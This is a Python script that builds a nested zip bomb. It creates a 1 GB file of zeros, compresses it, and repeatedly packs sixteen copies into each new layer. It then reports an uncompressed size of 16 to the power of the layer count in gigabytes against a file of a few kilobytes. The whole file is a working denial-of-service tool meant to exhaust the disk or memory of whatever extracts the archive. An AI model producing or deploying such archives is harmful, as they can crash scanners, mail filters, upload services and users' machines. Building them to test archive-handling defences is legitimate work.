import os
import zipfile
import shutil
import time

layers = int(input("How many layers do you want? "))
name = input("What is the zip's filename? ")

def make_file():
    f = open('bomb.txt',"wb")
    f.seek(1073741824-1)
    f.write(b"\0")
    f.close() 

def make_bomb(layers, name):
    dir = os.getcwd()
    print(f"Creating bomb with {layers} layers, to file name {name} in directory {dir}")   

    with zipfile.ZipFile(f'{name}.zip', 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.write('bomb.txt', arcname='bomb.txt')

    

    for x in range(layers):
        for i in range(16):
            shutil.copyfile(f"{name}.zip", f"{name}{i}.zip")

        os.remove(f"{name}.zip")

        with zipfile.ZipFile(f'{name}.zip', 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            for i in range(16):
                zf.write(f"{name}{i}.zip")

            os.remove(f"{name}0.zip")
            os.remove(f"{name}1.zip")
            os.remove(f"{name}2.zip")
            os.remove(f"{name}3.zip")
            os.remove(f"{name}4.zip")
            os.remove(f"{name}5.zip")
            os.remove(f"{name}6.zip")
            os.remove(f"{name}7.zip")
            os.remove(f"{name}8.zip")
            os.remove(f"{name}9.zip")
            os.remove(f"{name}10.zip")
            os.remove(f"{name}11.zip")
            os.remove(f"{name}12.zip")
            os.remove(f"{name}13.zip")
            os.remove(f"{name}14.zip")
            os.remove(f"{name}15.zip")

        print(x)

make_file()
make_bomb(layers, name)
file_size = os.stat(f'{name}.zip')
size = pow((1 * 16), layers)
print("Total Uncompressed Size = " +  str(size) + " GB or " + str((size / 1024)) + " TB or " + str((size / 1024)/1024) + " PB | " + "Size of file :", round((file_size.st_size / 1024), 2), "KB")
